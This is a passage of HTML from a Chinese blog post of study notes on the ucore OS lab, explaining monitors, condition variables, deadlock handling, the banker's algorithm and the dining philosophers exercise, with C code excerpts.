href="https://kiprey.github.io/2020/09/uCore-7/#5-%E7%AE%A1%E7%A8%8B">原理</a> </p></blockquote><p>ucore中的管程机制是基于信号量和条件变量来实现的。ucore中的管程的数据结构monitor_t定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">monitor</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex;<span class="hljs-comment">// the mutex lock for going into the routines in monitor, should be initialized to 1</span><br>    <span class="hljs-comment">// the next semaphore is used to </span><br>    <span class="hljs-comment">//    (1) procs which call cond_signal funciton should DOWN next sema after UP cv.sema</span><br>    <span class="hljs-comment">// OR (2) procs which call cond_wait funciton should UP next sema before DOWN cv.sema</span><br>    <span class="hljs-keyword">semaphore_t</span> next;        <br>    <span class="hljs-keyword">int</span> next_count;         <span class="hljs-comment">// the number of of sleeped procs which cond_signal funciton</span><br>    <span class="hljs-keyword">condvar_t</span> *cv;          <span class="hljs-comment">// the condvars(是一个array) in monitor</span><br>&#125; <span class="hljs-keyword">monitor_t</span>;<br></code></pre></div></td></tr></table></figure><p>Since a signaling process must wait until the resumed process either leaves or waits, an additional binary semaphore, next, is introduced, initialized to 0. ==The signaling processes can use next to suspend themselves==. An integer variable next count is also provided to count the number of processes suspended on next. </p><p>管程中的条件变量的数据结构condvar_t定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">condvar</span>&#123;</span><br><span class="hljs-comment">// the sem semaphore is used to down the waiting proc, and the signaling proc should up the waiting proc</span><br>    <span class="hljs-keyword">semaphore_t</span> sem;     <br>    <span class="hljs-keyword">int</span> count;       　    <span class="hljs-comment">// the number of waiters on condvar</span><br>    <span class="hljs-keyword">monitor_t</span> * owner;     <span class="hljs-comment">// the owner(monitor) of this condvar</span><br>&#125; <span class="hljs-keyword">condvar_t</span>;<br></code></pre></div></td></tr></table></figure><p>条件变量的定义中也包含了一系列的成员变量，信号量sem用于让发出<code>wait_cv</code>操作的等待某个条件Cond为真的进程睡眠，而让发出<code>signal_cv</code>操作的进程通过这个sem来唤醒睡眠的进程, <strong>可以看出条件变量是信号量的高层封装.</strong> </p><p>要看懂monitor还可以看看他的初始化函数:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// Initialize monitor.</span><br><span class="hljs-keyword">void</span>  <span class="hljs-comment">//monitor中的cv其实是一个数组头, 大小是这个函数的num_cv参数, 能存放多个条件变量, 这样方便管程控制</span><br>monitor_init (<span class="hljs-keyword">monitor_t</span> * mtp, <span class="hljs-keyword">size_t</span> num_cv) &#123;<br>    <span class="hljs-keyword">int</span> i;<br>    assert(num_cv&gt;<span class="hljs-number">0</span>);<br>    mtp-&gt;next_count = <span class="hljs-number">0</span>;<br>    mtp-&gt;cv = <span class="hljs-literal">NULL</span>;<br>    sem_init(&amp;(mtp-&gt;mutex), <span class="hljs-number">1</span>); <span class="hljs-comment">//unlocked</span><br>    sem_init(&amp;(mtp-&gt;next), <span class="hljs-number">0</span>);<span class="hljs-comment">//注意到这两个的初始化并不一致, next一开始是空的</span><br>    mtp-&gt;cv =(<span class="hljs-keyword">condvar_t</span> *)kmalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">condvar_t</span>)*num_cv);<br>    assert(mtp-&gt;cv!=<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;num_cv; i++)&#123;<span class="hljs-comment">//初始化条件变量</span><br>        mtp-&gt;cv[i].count=<span class="hljs-number">0</span>;<br>        sem_init(&amp;(mtp-&gt;cv[i].sem),<span class="hljs-number">0</span>);<br>        mtp-&gt;cv[i].owner=mtp;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ucore设计实现了条件变量<code>wait_cv</code>操作和<code>signal_cv</code>操作对应的具体函数，即<code>cond_wait</code>函数和<code>cond_signal</code>函数，此外还有<code>cond_init</code>初始化函数（可直接看源码）</p><p><strong>signal_cv的原理描述</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>( cv.count &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//如果该cv上没有等待的进程, 直接跳过</span><br>   monitor.next_count ++;<span class="hljs-comment">//否则next_count++</span><br>   sem_signal(cv.sem);<span class="hljs-comment">//唤醒队列中第一个进程</span><br>   sem_wait(monitor.next);<span class="hljs-comment">//一开始的时候next.value=0, 当前进程肯定会被挂起并schedule();</span><br>                            <span class="hljs-comment">//后来(???</span><br>   monitor.next_count -- ;<span class="hljs-comment">//被唤醒后就减掉了</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>实际代码是差不多的:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(cvp-&gt;count&gt;<span class="hljs-number">0</span>) &#123;<br>    cvp-&gt;owner-&gt;next_count ++;<br>    up(&amp;(cvp-&gt;sem));<br>    down(&amp;(cvp-&gt;owner-&gt;next));<br>    cvp-&gt;owner-&gt;next_count --;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>wait_cv的原理描述</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cv.count++;<span class="hljs-comment">//等待数量+1</span><br><span class="hljs-keyword">if</span>(monitor.next_count &gt; <span class="hljs-number">0</span>)<span class="hljs-comment">//有大于等于1个进程执行cond_signal函数且sleep</span><br>   sem_signal(monitor.next);<span class="hljs-comment">//唤醒wait_queue第一个进程</span><br><span class="hljs-keyword">else</span><span class="hljs-comment">//没有进程因执行cond_signal而挂起</span><br>   sem_signal(monitor.mutex);<span class="hljs-comment">//解开互斥锁, 好让其他进程进入管程</span><br>sem_wait(cv.sem);<span class="hljs-comment">//当前进程需要等待信号(见下方)</span><br>cv.count --;<br></code></pre></div></td></tr></table></figure><blockquote><p>有一点迷惑的地方在于等待信号是在程序中判断的吗? 看代码确实是这个意思, 到了sem_wait就一定会等待(通过相邻哲学家的情况提前signal_cv, 设置state_condvar, 然后sem_wait都用不着判断cv.sem的value, 肯定是0.</p><p>没有弄清楚什么是必须写在操作系统里的什么是要写在程序中的</p></blockquote><p>实际代码:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cvp-&gt;count++;<br><span class="hljs-keyword">if</span>(cvp-&gt;owner-&gt;next_count &gt; <span class="hljs-number">0</span>)<br>    up(&amp;(cvp-&gt;owner-&gt;next));<br><span class="hljs-keyword">else</span><br>    up(&amp;(cvp-&gt;owner-&gt;mutex));<br>down(&amp;(cvp-&gt;sem));<br>cvp-&gt;count --;<br></code></pre></div></td></tr></table></figure><h3 id="5-管程中函数的入口出口设计"><a href="#5-管程中函数的入口出口设计" class="headerlink" title="5.管程中函数的入口出口设计"></a>5.管程中函数的入口出口设计</h3><p>为了让整个管程正常运行，还需在管程中的每个函数的入口和出口增加相关操作，即：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">function_in_monitor （…）<br>&#123;<br>  sem.wait(monitor.mutex);<br><span class="hljs-comment">//-----------------------------</span><br>  the real body of function;<br><span class="hljs-comment">//-----------------------------</span><br>  <span class="hljs-keyword">if</span>(monitor.next_count &gt; <span class="hljs-number">0</span>)<br>     sem_signal(monitor.next);<br>  <span class="hljs-keyword">else</span><br>     sem_signal(monitor.mutex);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这样带来的作用有两个，（1）只有一个进程在执行管程中的函数。（2）避免由于执行了cond_signal函数而睡眠的进程无法被唤醒。</p><p>具体是这样工作的: </p><ul><li>如果1号进程进入了临界区, 然后由于某种原因(比如外部中断)而切换到了另一个也要访问管程的进程2号, 那么2号就会在sem.wait()里被挂起来, 并且通过调度最终换到1号继续执行. </li><li>当1号执行到出口时, 他会发现next_count=0, 随后释放mutex锁, 发现1号在等待mutex, 所以将其唤醒, 在下一个中断中, 1号进入睡眠, 2号准备执行. (不一定是紧跟着的, 还要看调度器, 这里只是设置成了RUNNALBE)</li><li>2 号执行到出口时发现next_count=1, 于是up一下信号量next, 最终回到一号继续往下执行.</li></ul><h3 id="6-死锁"><a href="#6-死锁" class="headerlink" title="6.死锁"></a>6.死锁</h3><blockquote><p>不用可惜了(bushi <a href="https://kiprey.github.io/2020/09/uCore-7/#7-%E6%AD%BB%E9%94%81">[link]</a> </p></blockquote><h4 id="a-死锁概念"><a href="#a-死锁概念" class="headerlink" title="a. 死锁概念"></a>a. 死锁概念</h4><h5 id="1-进程访问资源的流程"><a href="#1-进程访问资源的流程" class="headerlink" title="1) 进程访问资源的流程"></a>1) 进程访问资源的流程</h5><ul><li>资源类型R1,R2,…，RmR1,R2,…，Rm: CPU执行时间，内存空间，I/O设备等。</li><li>每类资源RiRi有WiWi个实例</li><li>进程访问资源的流程<ul><li>请求/获取：申请空闲资源</li><li>使用/占用：进程占用资源</li><li>释放：资源状态由占用变成空闲。</li></ul></li></ul><h5 id="2-资源分类"><a href="#2-资源分类" class="headerlink" title="2) 资源分类"></a>2) 资源分类</h5><ul><li>可重用资源（Reusable Resource）<ul><li>资源不能被删除且自任何时刻只能有一个进程在使用</li><li>进程释放资源后，其他进程可重用</li><li>可重用资源示例：硬件如处理器、I/O设备等，软件如文件、数据库等</li><li>可能出现死锁：每个进程占用一部分资源并请求其他资源</li></ul></li><li>消费资源 (Consumable resource)<ul><li>资源创建和销毁</li><li>消耗资源示例：中断、信号、消息</li><li>可能出现死锁：进程间相互等待接收对方的消息</li></ul></li></ul><h5 id="3-出现死锁的必要条件"><a href="#3-出现死锁的必要条件" class="headerlink" title="3) 出现死锁的必要条件"></a>3) 出现死锁的必要条件</h5><ul><li>互斥：任何时刻只能有一个进程使用一个资源实例</li><li>持有并等待：进程保持至少一个资源，并正在等待获取其他进程持有的资源</li><li>非抢占：资源只能在进程使用后自愿释放</li><li>循环等待：进程间相互循环等待</li></ul><h4 id="b-死锁处理方法"><a href="#b-死锁处理方法" class="headerlink" title="b. 死锁处理方法"></a>b. 死锁处理方法</h4><blockquote><p>死锁检测较为复杂，通常由应用程序处理死锁，<strong>操作系统会忽略死锁</strong> </p></blockquote><h5 id="1-死锁预防"><a href="#1-死锁预防" class="headerlink" title="1) 死锁预防"></a>1) 死锁预防</h5><blockquote><p>死锁预防（Deadlock Prevention) ： 确保系统永远不会进入死锁状态。</p></blockquote><p>预防是采用某种策略，<strong>限制</strong>并发进程对资源的请求，使系统在任何时刻都<strong>不满足死锁的必要条件</strong>。</p><ul><li>互斥：把互斥的共享资源封装成可同时访问的</li><li>持有并等待：进程请求资源时，要求它不持有任何其他资源。仅允许进程在开始执行时，一次请求所有需要的资源，但这种做法的资源利用率低。</li><li>非抢占：如进程请求不能立即分配的资源，则释放已经占用的资源。只在能够同时获得所有需要资源时，才执行分配操作。</li><li>循环等待：对资源排序，要求进程按顺序请求资源。</li></ul><h5 id="2-死锁避免"><a href="#2-死锁避免" class="headerlink" title="2) 死锁避免"></a>2) 死锁避免</h5><blockquote><p>死锁避免（Deadlock Avoidance）：在使用前进行判断，只允许不会出现死锁的进程请求资源。</p></blockquote><p>利用额外的先验信息，在分配资源时判断是否会出现死锁，只在不会出现死锁时分配资源。</p><ul><li>要求进程声明需要资源的<strong>最大数目</strong>。</li><li>限定<strong>提供</strong>与<strong>分配</strong>的资源数量，确保满足进程的<strong>最大</strong>需求。</li><li><strong>动态检查</strong>资源分配状态，确保不会出现环形等待。</li></ul><p>系统资源分配的安全状态</p><ul><li>当进程请求资源时，系统判断分配后是否处于安全状态。</li><li>系统处于安全状态：针对所有已占用进程，存在安全序列</li><li>序列&lt;P1,P2,…,PN&gt;是安全的<ul><li>PiPi要求的资源 &lt;= 当前可用资源 + 所有PjPj持有资源。其中<code>j&lt;i</code>。</li><li>如果PiPi的资源请求不能马上分配，则PiPi等待所有Pj(j&lt;i)Pj(j&lt;i)完成</li><li>PiPi完成后，Pi+1Pi+1可得到所需资源，执行并释放所分配的资源。</li><li>最终整个序列的所有PiPi都能获得所需资源。</li></ul></li></ul><p><strong>银行家算法</strong>（Banker’s Algorithm）</p><blockquote><p>银行家算法是一个避免死锁产生的算法，以银行借贷分配策略为基础，判断并保证系统处于安全状态。</p></blockquote><ul><li><p>使用的数据结构</p><blockquote><p>n = 线程数量， m = 资源类型数量</p></blockquote><ul><li>**Max(总需求量)**：n x m 矩阵，线程TiTi最多请求类型RiRi的资源Max[i,j]Max[i,j]个实例</li><li>**Available(剩余空闲量)**：长度为m的向量，当前有Available[i]Available[i]个类型RjRj的资源实例可用</li><li>**Allocation(已分配量)**：n x m 矩阵，线程TiTi当前分配了Allocation[i,j]Allocation[i,j]个RjRj的实例</li><li>**Need(未来需要量)**： n x m矩阵，线程TiTi未来需要Need[i,j]Need[i,j]个RjRj资源实例。</li></ul><blockquote><p>Need[i,j]=Max[i,j]−Allocation[i,j]Need[i,j]=Max[i,j]−Allocation[i,j]</p></blockquote></li><li><p><strong>安全状态判断</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">COPY<span class="hljs-comment">// Work和Finish分别是长度为m和n的向量初始化</span><br>Work[m], Finish[n];<br><br>Work = Available; <span class="hljs-comment">// 当前资源剩余空闲量</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>  Finish[i] = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 线程i没结束</span><br><br><span class="hljs-comment">// ...每个线程开始运行并分配资源</span><br><br><span class="hljs-comment">// 在一段时间后</span><br><span class="hljs-comment">// 寻找Need比Work小，同时还未结束的线程Ti</span><br><span class="hljs-keyword">while</span>(Finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Need[i] &lt;= Work)<br>&#123;<br>    <span class="hljs-comment">// 线程i的资源需求量小于当前剩余空闲资源量，所以该线程可以正常结束，并回收该线程的所有资源</span><br>    Work += Allocation[i];<br>    Finish[i] = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">// 如果所有线程Ti都满足Finish[i] == true,则系统处于安全状态。</span><br><span class="hljs-keyword">if</span>(Finish == <span class="hljs-literal">true</span>)<br>    Safe;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-comment">// 反之，系统处于不安全状态。</span><br>    NoSafe;<br></code></pre></div></td></tr></table></figure></li><li><p>银行家算法具体设计</p><ul><li><p>初始化：Request_i：线程TiTi的资源请求向量， Requesti[j]Requesti[j]：线程TiTi请求资源RjRj的实例</p></li><li><p>循环：</p><ol><li><p>如果Requesti&lt;=Need[i]Requesti&lt;=Need[i]，则转到步骤2。否则拒绝资源申请，因为线程已经超过了其最大资源要求。</p></li><li><p>如果Requesti&lt;=Available，转到步骤3。否则，Ti必须等待，因为资源不可用。</p></li><li><p>通过安全状态判断来确定是否分配资源给Ti</p><ul><li><p>生成一个需要判断状态是否安全的资源分配环境</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">COPYAvailable = Available - Request_i;<br>Allocation[i] = Allocation[i] + Request_i;<br>Need[i] = Need[i] - Request_i;<br></code></pre></div></td></tr></table></figure></li><li><p>并调用上文的<strong>安全状态判断</strong></p><ul><li>如果返回结果是<strong>安全</strong>，则将资源分配给TiTi</li><li>如果返回结果是<strong>不安全</strong>，系统会拒绝TiTi的资源请求</li></ul></li></ul></li></ol></li></ul></li></ul><h5 id="3-死锁检测和恢复"><a href="#3-死锁检测和恢复" class="headerlink" title="3) 死锁检测和恢复"></a>3) 死锁检测和恢复</h5><blockquote><p>死锁检测和恢复（Deadlock Detection &amp; Recovery） : 在检测到运行系统进入死锁状态后进行恢复。</p></blockquote><ul><li>特点<ul><li>允许系统进入死锁状态</li><li>维护系统的资源分配图</li><li>定期调用死锁检测算法来搜索图中是否存在死锁</li><li>出现死锁时，用死锁恢复机制进行恢复。</li></ul></li></ul><h6 id="i-死锁检测"><a href="#i-死锁检测" class="headerlink" title="i. 死锁检测"></a>i. 死锁检测</h6><ul><li><p>数据结构</p><ul><li>**Available(剩余空闲量)**：长度为m的向量，每种类型可用资源的数量</li><li>**Allocation(已分配量)**：n x m 矩阵，当前分配给各个进程每种类型资源的数量，进程PiPi拥有资源RiRi的Allocation[i,j]Allocation[i,j]个实例。</li></ul></li><li><p>死锁检测算法</p><blockquote><p>该算法与银行家算法类似。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">COPY<span class="hljs-comment">// Work和Finish分别是长度为m和n的向量初始化</span><br>Work[m], Finish[n];<br><br>Work = Available; <span class="hljs-comment">// 当前资源剩余空闲量</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>    <span class="hljs-comment">// 如果当前遍历到的线程占用资源，则设置Finish为false</span><br>    <span class="hljs-comment">// 反之，如果当前线程不占用资源，则要么是线程已结束，要么是我们不关心的线程</span><br>    <span class="hljs-keyword">if</span>(Allocation[i] &gt; <span class="hljs-number">0</span>)<br>      Finish[i] = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 线程i没结束</span><br>    <span class="hljs-keyword">else</span><br>      Finish[i] = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// ...每个线程开始运行并分配资源</span><br><br><span class="hljs-comment">// 在一段时间后</span><br><span class="hljs-comment">// 寻找Request比Work小，同时还未结束的线程Ti</span><br><span class="hljs-keyword">while</span>(Finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Request[i] &lt;= Work)<br>&#123;<br>    <span class="hljs-comment">// 线程i的资源需求量小于当前剩余空闲资源量，所以该线程可以正常结束，并回收该线程的所有资源</span><br>    Work += Allocation[i];<br>    Finish[i] = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">// 如果所有线程Ti都满足Finish[i] == true,则系统处于正常状态</span><br><span class="hljs-keyword">if</span>(Finish == <span class="hljs-literal">true</span>)<br>    NoDeadlock;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-comment">// 反之，系统处于死锁状态。</span><br>    Deadlock;<br></code></pre></div></td></tr></table></figure></li><li><p>死锁检测算法的使用</p><ul><li>死锁检测的时间和周期选择依据<ul><li>死锁多久可能会发生</li><li>多少进程需要被回滚</li></ul></li><li>资源图可能有多个循环，难以分辨”造成“死锁的关键进程</li></ul></li></ul><h6 id="ii-死锁恢复"><a href="#ii-死锁恢复" class="headerlink" title="ii. 死锁恢复"></a>ii. 死锁恢复</h6><ul><li>进程终止<ul><li>终止所有的死锁线程</li><li>一次只终止一个进程直到死锁消除</li><li>终止进程的顺序应该是<ul><li>进程的优先级: 通常是优先级低的</li><li>进程已运行时间以及还需运行时间: 希望运行时间短的</li><li>进程已占用资源: 占用资源少的</li><li>进程完成需要的资源</li><li>终止进程数目: 自然是越小越好</li><li>进程是交互式还是批处理: 通常是用户交互进程</li></ul></li></ul></li><li>资源抢占<ul><li>选择被抢占进程：最小成本目标</li><li>进程回退：返回到一些安全状态，重启进程到安全状态</li><li>可能会出现饥饿：同一个进程可能一直被选作被抢占者</li></ul></li></ul><h2 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h2><h3 id="练习1-4"><a href="#练习1-4" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p>理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题</p></blockquote><p>信号量的实现在知识点中有分析. 这里写哲学家就餐问题检查函数的实现和信号量的联系.</p><p>在kern\sync\check_sync.c中有check_sync()函数, 分为使用 信号量的检查 以及 管程的检查, 拿前者说明, 该种检查调用<code>sem_init(&amp;mutex, 1)</code>初始化mutex, 需要设置下面这几个变量存储必要信息. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> state_sema[N]; <span class="hljs-comment">/* 记录每个人状态的数组 */</span><br><span class="hljs-keyword">semaphore_t</span> mutex; <span class="hljs-comment">/* 临界区互斥 */</span><br><span class="hljs-keyword">semaphore_t</span> s[N]; <span class="hljs-comment">/* 每个哲学家一个信号量, 表示是否得到了叉子 */</span><br></code></pre></div></td></tr></table></figure><p>然后创建五个内核线程, 线程调用的函数为philosopher_using_[semaphore, monitor], 进入一个总共4次的循环. </p><p>每次循环就是重复思考, 取叉, 进餐, 放叉几个动作, 模拟进程使用资源的几种操作.</p><p>比如取叉会调用<code>phi_take_forks_sema()</code>函数, </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phi_take_forks_sema</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> <span class="hljs-comment">/* i：哲学家号码从0到N-1 */</span></span><br><span class="hljs-function"></span>&#123; <br>        down(&amp;mutex); <span class="hljs-comment">/* 进入临界区 */</span><br>        state_sema[i]=HUNGRY; <span class="hljs-comment">/* 记录下哲学家i饥饿的事实 */</span><br>        phi_test_sema(i); <span class="hljs-comment">/* 试图得到两只叉子 */</span><br>        up(&amp;mutex); <span class="hljs-comment">/* 离开临界区 */</span><br>        down(&amp;s[i]); <span class="hljs-comment">/* 如果得不到叉子就阻塞 */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>这是一个互斥的资源请求, <del>我认为该函数可以理解为这就相当于进程使用一种系统调用, 在操作系统层面进行进入和离开临界区的操作.</del> ==好吧信号量这种方法其实是需要程序员写出来的.==</p><ul><li>先是临界区互斥信号量mutex的P操作(实现在知识点2里), 同一时间只能有一个哲学家进入临界区</li><li>然后试图得到两只叉子还要查看左边右边哲学家是否在EATING状态, 得到了就进行该哲学家信号量s[i]的V操作, 表示取到了叉子</li><li>最后一句就是如果没取到叉子又进行了P操作, 这时候肯定就阻塞了, 这时候会进行schedule(), 切换到其他进程<ul><li>这一步有点特别, 因为要在临界区内进行一次V操作, 然后在外面进行一次P操作检查刚刚是否进行了V操作.</li></ul></li></ul><p>如果有其他哲学家使用V操作释放了叉子, 就会调用wakeup_wait()来使该信号量的等待队列里的第一个变成RUNNALBLE, 所有使用这种资源的进程只有这个能就绪, 如果调度器调度到了这个进程就可以继续进行了.</p><p>接下来进餐sleep 10个时间片, 然后到了放下叉子. 这时候<strong>需要程序员清楚地知道</strong>放下后需要进行的操作, 这里是检查左右邻座是否在HUNGRY状态, 是的话允许他拿起叉子(通过<code>up(&amp;s[i])</code>).</p><p>大概的过程就是这样.</p><h3 id="练习2-4"><a href="#练习2-4" class="headerlink" title="练习2"></a>练习2</h3><blockquote><p>完成内核级条件变量和基于内核级条件变量的哲学家就餐问题, 内核级条件变量的设计描述</p></blockquote><p>管程里的全局变量:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> state_condvar[N];                            <span class="hljs-comment">// the philosopher&#x27;s state: EATING, HUNGARY, THINKING  </span><br><span class="hljs-keyword">monitor_t</span> mt, *mtp=&amp;mt;                          <span class="hljs-comment">// monitor</span><br></code></pre></div></td></tr></table></figure><p>而monitor是这样的(重复了一下上面的):</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">monitor</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex;<span class="hljs-comment">// the mutex lock for going into the routines in monitor, should be initialized to 1</span><br>    <span class="hljs-comment">// the next semaphore is used to </span><br>    <span class="hljs-comment">//    (1) procs which call cond_signal funciton should DOWN next sema after UP cv.sema</span><br>    <span class="hljs-comment">// OR (2) procs which call cond_wait funciton should UP next sema before DOWN cv.sema</span><br>    <span class="hljs-keyword">semaphore_t</span> next;        <br>    <span class="hljs-keyword">int</span> next_count;         <span class="hljs-comment">// the number of of sleeped procs which cond_signal funciton</span><br>    <span class="hljs-keyword">condvar_t</span> *cv;          <span class="hljs-comment">// the condvars in monitor</span><br>&#125; <span class="hljs-keyword">monitor_t</span>;<br></code></pre></div></td></tr></table></figure><p>大致流程跟上面差不多, 在管程内部设置了cv数组来记录是否拿到了叉子, cond_signal和cond_wait的原理和实现在知识点中.</p><div style="display: none;"><ul><li><p>管程由一个锁和多个条件变量组成，以下是管程和条件变量的结构体代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">monitor</span> <span class="hljs-title">monitor_t</span>;</span><br><br><span 